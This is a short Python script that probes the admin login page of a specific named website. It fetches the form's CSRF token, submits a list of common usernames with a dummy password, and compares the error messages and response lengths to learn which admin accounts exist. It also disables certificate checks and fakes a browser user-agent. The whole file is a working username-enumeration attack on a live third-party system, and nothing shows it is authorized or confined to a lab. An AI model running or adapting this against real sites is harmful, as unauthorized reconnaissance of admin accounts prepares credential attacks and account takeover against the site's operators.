import httpx, re
c=httpx.Client(verify=False, follow_redirects=True, timeout=15,
    headers={'User-Agent':'Mozilla/5.0'})
URL='https://ofa77.shop/module/admin/unionshop/user/login'
def get_token():
    r=c.get(URL); m=re.search(r'name="_token" value="([^"]+)"', r.text); return m.group(1) if m else None
def probe(user, pw='pw'):
    tok=get_token()
    r=c.post(URL, data={'_token':tok,'username':user,'password':pw})
    # find the actual error alert text
    m=re.search(r'class="[^"]*error[^"]*"[^>]*>([^<]{2,40})<', r.text)
    msg=m.group(1).strip() if m else '?'
    # also check any text near 'form-message' or alert
    m2=re.search(r'(<div[^>]*class="[^"]*(?:alert|form-message|error)[^"]*"[^>]*>.*?)(</div>)', r.text, re.S)
    extra=''
    if m2: extra=re.sub(r'<[^>]+>','',m2.group(1))[:50]
    return r.status_code, len(r.text), msg, extra
for u in ['nonexistentuser12345','admin','root','manager','zzzqqqxxx','test','ofa77','superadmin']:
    sc,ln,msg,ex=probe(u)
    print(f'{u:22} sc={sc} len={ln} msg={msg!r} extra={ex!r}')
